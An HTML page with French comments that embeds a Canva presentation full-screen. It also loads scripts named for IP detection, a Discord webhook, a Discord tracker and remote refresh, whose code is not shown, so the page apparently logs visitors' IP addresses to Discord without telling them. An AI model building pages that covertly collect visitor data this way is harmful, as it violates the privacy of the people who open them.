<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Echo - Canva</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="icon" href="assets/favicon.ico" type="image/x-icon">
    <script src="js/ip-detection.js"></script>
    <script type="module" src="js/discord-webhook.js"></script>
    <script src="js/discord-tracker.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body,
        html {
            height: 100%;
            overflow: hidden;
            /* Empêche tout défilement de la page */
        }

        .iframe-container {
            /*position: relative;*/
            width: 100%;
            height: 0;
            padding-top: 56.2500%;
            /* Aspect ratio 16:9 */
            box-shadow: 0 2px 8px 0 rgba(63, 69, 81, 0.16);
            margin-top: 1.6em;
            margin-bottom: 0.9em;
            overflow: hidden;
            /* Cache tout défilement à l'intérieur du conteneur */
            border-radius: 8px;
        }

        iframe {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            border: none;
            padding: 0;
            margin: 0;
            overflow: hidden !important;
            /* Empêche le scroll dans l'iframe */
            /*pointer-events: none; /* Empêche toute interaction avec l'iframe si nécessaire */
        }
    </style>
</head>

<body>
    <div class="iframe-container">
        <iframe loading="lazy" src="https://www.canva.com/design/DAG7HDT1Ilk/gtCj-eUXcbVhXY0lc9hFng/view?embed"
            allowfullscreen="allowfullscreen" allow="fullscreen">
        </iframe>
    </div>
    <script type="module" src="js/remote-refresh.js"></script>
</body>

</html>
